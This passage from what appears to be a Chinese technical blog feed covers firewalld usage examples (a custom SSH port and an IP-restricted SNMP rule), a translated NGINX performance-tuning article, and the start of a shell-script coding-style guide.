配置的好处显而易见，第一，通过服务名字来管理规则更加人性化，第二，通过服务来组织端口分组的模式更加高效，如果一个服务使用了若干个网络端口，则服务的配置文件就相当于提供了到这些端口的规则管理的批量操作快捷方式。每加载一项 service 配置就意味着开放了对应的端口访问，使用下面的命令分别列出所有支持的 service 和查看当前 zone 种加载的 service：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">firewall-cmd --get-services</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">firewall-cmd --list-services</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="使用示例">使用示例<a class="hash-link" href="#使用示例" title="标题的直接链接">​</a></h2><p>在 firewalld 官方文档中提供了若干使用示例，这些示例对学习防火墙管理是很好的基本参考资料。接下来我们将通过一些真实的使用示例来展示如何使用 firewalld 对防火墙规则进行管理。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="场景一自定义-ssh-端口号">场景一：自定义 ssh 端口号<a class="hash-link" href="#场景一自定义-ssh-端口号" title="标题的直接链接">​</a></h3><p>出于安全因素我们往往需要对一些关键的网络服务默认端口号进行变更，如 ssh，ssh 的默认端口号是 22，通过查看防火墙规则可以发现默认是开放了 22 端口的访问的：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# iptables -S</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">... ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-A IN_public_allow -p tcp -m tcp --dport 22 -m conntrack --ctstate NEW -j ACCEPT</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>假设自定义的 ssh 端口号为 22022，使用下面的命令来添加新端口的防火墙规则：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">firewall-cmd --add-port=22022/tcp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>如果需要使规则保存到 zone 配置文件，则需要加参数 --permanent。我们还可以使用自定义 service 的方式来实现同样的效果：
在 <code>/etc/firewalld/services/</code> 目录中添加 自定义配置文件 custom-ssh.xml ，内容如下：</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token prolog" style="color:#999988;font-style:italic">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">service</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">short</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">customized SSH</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">short</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">description</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">Secure Shell (SSH) is a protocol for logging into and executing commands on remote machines. It provides secure encrypted communications. If you plan on accessing your machine remotely via SSH over a firewalled interface, enable this option. You need the openssh-server package installed for this option to be useful.</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">description</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">port</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">protocol</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">tcp</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">port</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">22022</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">service</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>执行命令重载配置文件，并添加防火墙规则:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systemctl reload firewalld</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">firewall-cmd --add-service=custom-ssh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>一旦新的规则生效，旧的 ssh 端口规则旧可以被禁用掉：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">firewall-cmd --remove-service=ssh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="场景二允许指定的ip访问snmp服务">场景二：允许指定的IP访问SNMP服务<a class="hash-link" href="#场景二允许指定的ip访问snmp服务" title="标题的直接链接">​</a></h3><p>某些特殊的服务我们并不想开放给所有人访问，只需要开放给特定的IP地址即可，例如 SNMP 服务，我们将使用 firewalld 的富语言风格配置指令：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">firewall-cmd --add-rich-rule="rule family='ipv4' source address='10.0.0.2' port port='161' protocol='udp' accept"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>查看防火墙规则状态，证明结果正是我们想要的：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@localhost ~]# iptables -S</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">... ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-A IN_public_allow -s 10.0.0.2/32 -p udp -m udp --dport 161 -m conntrack --ctstate NEW -j ACCEPT</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>参考链接：<sup id="fnref-2-c7e489"><a href="#fn-2-c7e489" class="footnote-ref">2</a></sup></p><div class="footnotes"><hr><ol><li id="fn-1-c7e489"><a href="https://fedoraproject.org/wiki/FirewallD/zh-cn" target="_blank" rel="noopener noreferrer">https://fedoraproject.org/wiki/FirewallD/zh-cn</a><a href="#fnref-1-c7e489" class="footnote-backref">↩</a></li><li id="fn-2-c7e489"><a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/7/html/Security_Guide/sec-Using_Firewalls.html" target="_blank" rel="noopener noreferrer">https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/7/html/Security_Guide/sec-Using_Firewalls.html</a><a href="#fnref-2-c7e489" class="footnote-backref">↩</a></li></ol></div>]]></content>
        <category label="firewalld" term="firewalld"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[NGINX性能调优简要]]></title>
        <id>/2014/10/19/nginx-perf-tun</id>
        <link href="https://itxx00.github.io/notes/blog/2014/10/19/nginx-perf-tun"/>
        <updated>2014-10-19T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>以下是数天前NGINX官方博客发表的一篇有关nginx性能优化的文章，内容简明扼要，值得一读。译文在原文基础上略有变动，如有不足，欢迎指正。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="前言">前言<a class="hash-link" href="#前言" title="标题的直接链接">​</a></h2><p>NGINX作为一款高性能负载均衡器，缓存和web服务器被大家所熟知，为全世界40%的网站提供着服务。NGINX和Linux系统中的大多数默认配置对普通应用来说已经很合适，然而要想达到更高的性能以应对高负载场景那么一些性能优化是必须的。这篇文章将会探讨一些在性能调优时涉及到的NGINX和Linux系统参数。当然可供调节的参数众多，我们这里只会涉及部分对大多数用户来说被使用最多的。其他没有被涉及到的参数多是需要对系统有深入了解之后才需要接触到的。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="简介">简介<a class="hash-link" href="#简介" title="标题的直接链接">​</a></h2><p>我们假定此文读者对NGINX的基本架构和配置有一定了解，此文不会重复NGINX文档中的内容，如有涉及我们仅会给出链接。</p><p>在做性能调优时一个最佳实践是一次只动一个参数，如果调整后未达到预期效果，则将其修改回初始值。我们将从Linux系统的一些参数开始讲起，这些参数将对后续的NGINX配置调整有着至关重要的作用。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="linux-配置">Linux 配置<a class="hash-link" href="#linux-配置" title="标题的直接链接">​</a></h2><p>现代Linux内核（2.6+）中的很多参数设置都是十分到位的，但是仍然有一些是需要我们进行调整的。如果一些默认的值设置得太小，那么在内核日志中将记录着错误信息，这预示着我们需要对其中一些参数进行调整了。在众多选项当中我们只会涉及到对大多数负载场景都实用的，请参考Linux系统文档以了解更多有关这些选项的细节。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="backlog-queue">Backlog Queue<a class="hash-link" href="#backlog-queue" title="标题的直接链接">​</a></h3><p>下面的设置与网络连接和连接队列有直接关联。如果你有大量的接入请求，且偶尔出现一些失效请求的话，那么下面的设置将起到优化效果。</p><p><code>net.core.somaxconn</code></p><p>此参数控制NGINX等待连接的队列大小。因NGINX处理连接的速度快，所以一般这个参数不建议被设置太大，但是默认值有点偏低，所以针对大流量网站来说调整这个参数是必须的，如果此参数被设置多低那么有可能在内核日志中看到报错，这时需要调整此参数直到报错消失为止。注意，如果此参数设置大于512的话，则需要对NGINX配置中的listen指令中的backlog参数进行同步调整。</p><p><code>net.core.netdev_max_backlog</code></p><p>此参数控制数据包在进入CPU处理前，在网卡中被缓存的量，需要处理大带宽的机器需要增加此参数的值。设置此参数需要参考具体的网卡的文档或者根据系统错误日志进行调整。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="file-descriptors">File Descriptors<a class="hash-link" href="#file-descriptors" title="标题的直接链接">​</a></h3><p>文件描述符是系统在处理如网络连接和打开文件时的系统资源。NGINX中每个连接的建立可能需要占用两个文件描述符，例如代理模式下，一个用来处理客户端连接，一个用来处理到后端的连接，而如果HTTP keepalives被启用的话对文件描述符的消耗会轻松一些。需要处理高并发的机器建议调整下面的参数：</p><p><code>sys.fs.file_max</code></p><p>这个参数影响系统全局的文件描述符打开数量限制。</p><p><code>nofile</code></p><p>此参数影响单个用户的文件描述符数量，在/etc/security/limits.conf中进行设置。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ephemeral-ports">Ephemeral ports<a class="hash-link" href="#ephemeral-ports" title="标题的直接链接">​</a></h3><p>当NGINX被作为代理服务器时，每个到后端服务器的连接将占用一个临时的，或短期的端口。</p><p><code>net.ipv4.ip_local_port_range</code></p><p>此参数控制可被用作临时端口的起始范围，一个通用设置是1024-65000</p><p><code>net.ipv4.tcp_fin_timeout</code></p><p>此参数控制一个连接使用完毕后端口被回收再利用的超时时间，一般默认设置为60秒，但是一般设置降低到30或者15秒都是没有问题的。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="nginx-配置">NGINX 配置<a class="hash-link" href="#nginx-配置" title="标题的直接链接">​</a></h2><p>下面介绍NGINX中对性能有影响的参数，如下面提到的一样，我们只讲解一些适用于大多数用户的参数进行调整，其他未提及的可能是不建议调整的。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="worker-processes">Worker Processes<a class="hash-link" href="#worker-processes" title="标题的直接链接">​</a></h3><p>NGINX可以同时启动多个worker进程，每个进程处理大量的连接，通过调整下面的参数可以控制启动的进程数量和每个进程所处理的连接数量。</p><p><code>worker_processes</code></p><p>此参数控制NGINX启动进程的数量，在多数情况下每个cpu核心分配一个进程是最佳的，将参数值设置为auto即可达到。很多场景下都需要增加此参数的值，如在需要处理大量磁盘I/O的场景。默认的值是1。</p><p><code>worker_connections</code></p><p>此参数控制在同一时刻单个进程可以处理的最大连接数。默认值512，但大多数系统都可以处理更大的量。其最佳值与实际场景和系统有关，需要经过反复测试才能得出。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="keepalives">Keepalives<a class="hash-link" href="#keepalives" title="标题的直接链接">​</a></h3><p>Keepalive连接降低连接的建立和关闭对CPU和网络的消耗，对性能有着十分重要的影响。NGINX会关闭所有客户端的连接，且与后端服务器的连接都是独立的。NGINX支持到客户端和后端的keepalive，下面的参数对客户端keepalive进行控制：</p><p><code>keepalive_requests</code></p><p>此参数控制通过单个keepalive连接可以处理的客户端请求数量，默认值是100，可以调整为更大的值，特别是在通过单个客户端进行压力测试的时候。</p><p><code>keepalive_timeout</code></p><p>此参数控制单个keepalive连接在空闲状态保持连接的时间。</p><p>下面的参数对后端keepalive进行控制：</p><p><code>keepalive</code></p><p>此参数控制单个worker进程保持到upstream server的keepalive连接数量，且默认没有设置。如需启动到后端的keepalive连接则需要进行如下设置： </p><p><code>proxy_http_version 1.1;</code>
<code>proxy_set_header Connection "";</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="access-logging">Access Logging<a class="hash-link" href="#access-logging" title="标题的直接链接">​</a></h3><p>请求产生的日志记录对CPU和I/O都有消耗，一个可以降低资源消耗的办法是启用日志缓存。启用日志缓存后，NGINX将缓存部分请求日志，然后一次性写入文件。要启用日志缓存只需要在access_log中增加“buffer=size”的设置即可，size值控制缓存的大小，同时也可以设置“flush=time”以控制缓存的时间，设置了两个参数后，NGINX会在缓存被充满或者日志条目数达到flush值时回写日志。在worker进程重启或者关闭时也会回写日志。而永久禁用日志记录也是可以实现的。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="sendfile">Sendfile<a class="hash-link" href="#sendfile" title="标题的直接链接">​</a></h3><p>Sendfile 是一项操作系统特性，可以被NGINX启用。它通过对数据在文件描述符之间进行in-kernel copying来提供更快的tcp数据传输处理，一般通过zero-copy技术实现。NGINX使用它来完成缓存数据或者磁盘数据到socket的写操作，不产生任何的用户空间上下文切换开销，可降低CPU负载和提高处理速度。当启用sendfile特性之后，由于数据不经过用户空间，使得对数据内容进行处理的filter将不起作用，例如gzip filter将默认被禁用。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="limits">Limits<a class="hash-link" href="#limits" title="标题的直接链接">​</a></h3><p>NGINX也为用户提供设置连接限制的能力，用来对客户请求的资源进行控制，对系统性能，用户体验和安全性也产生极大的影响。下面是部分用于请求限制的指令：</p><p><code>limit_conn/limit_conn_zone</code></p><p>这两个指令用来控制NGINX可接收的连接数，例如来自单个客户端IP的连接请求。这有助于限制客户端建立过多的连接并消耗过多资源。</p><p><code>limit_rate</code></p><p>这个指令控制单个连接允许的客户端最大带宽。这可以避免系统被部分客户端耗尽资源，保证了为每个客户端请求提供服务的质量。</p><p><code>limit_req/limit_req_zone</code></p><p>这两个指令可以控制NGINX的请求回复水平，以不至于被部分客户端拖垮。也被用来加强安全性，特别是对登陆页面等进行有效的保护。</p><p><code>max_conns</code></p><p>这个指令用来控制到后端服务器的最大连接数，保护后端服务器不被拖垮，默认值是zero，没有任何限制。</p><p><code>queue</code></p><p>如果max_conns被设置，那么此参数对超过最大连接时的状态产生影响，可以设置队列中请求的个数和缓冲时间，如果没有设置此参数，则队列不存在。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="其他设置">其他设置<a class="hash-link" href="#其他设置" title="标题的直接链接">​</a></h2><p>NGINX还有一些特性能对某些特定场景下的应用起到性能优化作用，我们将探讨其中的两个特性。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="缓存">缓存<a class="hash-link" href="#缓存" title="标题的直接链接">​</a></h3><p>当把NGINX作为负载均衡器来使用的场景下，启用cache可以显著改善到客户端的响应时间，且显著降低后端服务器的压力。如需了解更多NGINX的caching设置，可以参考此链接：: NGINX Admin Guide – Caching.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="压缩">压缩<a class="hash-link" href="#压缩" title="标题的直接链接">​</a></h3><p>对回应内容进行压缩将有效降低回应内容的大小，降低带宽消耗，然而压缩将增加CPU的开销，所以带宽成本较高时启用才是明智之举。需要明确注意的是不要对已经压缩的内容启用压缩，例如jpeg格式的图片，如需了解更多有关压缩的设置可以参考此文档： NGINX Admin Guide – Compression and Decompression</p><p>原文链接:</p><p><a href="http://nginx.com/blog/tuning-nginx/" target="_blank" rel="noopener noreferrer">http://nginx.com/blog/tuning-nginx/</a></p>]]></content>
        <category label="nginx" term="nginx"/>
        <category label="performance" term="performance"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[shell脚本coding style总结]]></title>
        <id>/2014/05/23/bash-shell-coding-style</id>
        <link href="https://itxx00.github.io/notes/blog/2014/05/23/bash-shell-coding-style"/>
        <updated>2014-05-23T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>这里总结了个人比较推崇的shell脚本coding style，编写出方便阅读和维护的脚本是运维人员的基本操守。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>1.关于缩进： 一个tab定义为4个空格；
关于这个缩进距离貌似有太多的的说法了，有的会用8个空格，有的用2个空格，还有的用4个空格；不过最终取决于团队风格。但是记住，正确的做法是项目、文件、成员间全部统一，千万不要出现一个项目内各种缩进，tab和空格混用，甚至一个文件中的缩进都不统一的情况。在vim中设置如下：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">set ts=4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set sw=4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set expandtab</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>2.尽量缩短单行的长度，最好不超过72字符（注意：这个限制因历史原因导致，为了兼容那些老的终端设备而考虑，实际上现在已经不适用了，单行代码可以更长，只要不要超过大多数屏幕的输出宽度就好）</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">thisisaverylongline || thisisanotherlongline</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">thisisaverylongline ||</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    thisisanotherlongline</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>3.注释尽量保持清晰的层次,#号与注释文本间保持一个空格以示和代码的区分</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#this is a comment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#this is a code line</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># this is a comment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#this is code line</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path 